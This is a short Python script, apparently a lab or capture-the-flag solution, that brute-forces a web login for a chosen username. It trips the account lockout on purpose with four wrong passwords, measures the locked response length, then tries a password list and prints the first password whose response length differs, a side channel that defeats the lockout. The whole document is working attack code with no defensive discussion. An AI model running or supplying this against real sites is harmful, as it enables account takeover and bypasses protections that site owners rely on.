import requests
import time

# Replace with the URL you want to send the request to, should be end with /login
url = "https://www.example.com/login"

# save the passwords in a file called passwords.txt
file_path = 'passwords.txt'

#replace john with the user you found in the previous step
user = 'john'

#The idea is compute the length of the response when the password is incorrect for 4 times
# and locked, then save it in the variable invalid_password_output_size
data = {
        'username': user,
        'password': 'aa'
        }
        
response = requests.post(url, data=data)
response = requests.post(url, data=data)
response = requests.post(url, data=data)
response = requests.post(url, data=data)
response_content = response.content
invalid_password_output_size = len(response_content)

# Open the file in read mode
with open(file_path, 'r') as file:
    # Read each line from the file
    for line in file:
        password = line.strip()
    
        data = {
        'username': user,
        'password': password
        }
        
        response = requests.post(url, data=data)
        response_content = response.content
        response_size = len(response_content)

        #if different size is found then the password is correct and exit the loop
        if response_size!=invalid_password_output_size :
            print(password)
            break